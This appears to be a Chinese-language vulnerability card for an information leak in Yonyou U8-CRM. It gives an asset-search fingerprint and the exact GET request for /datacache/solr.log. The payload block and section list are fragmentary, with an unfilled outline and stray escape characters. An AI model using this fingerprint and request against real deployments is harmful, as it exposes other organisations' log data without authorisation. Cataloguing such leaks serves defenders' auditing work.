# 用友U8-CRMsolr存在信息泄露

- **系统**：用友　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app.name="用友 CRM"`
- **请求**：`GET /datacache/solr.log HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: PHPSESSID=o4tuofrv5viq6gs9111e50f8c6`

**请求体 / payload**
```

nuclei脚本\
\[用友-u8-crm-solr-信息泄露.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 用友U8-CRM solr 存在信息泄露: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8-CRM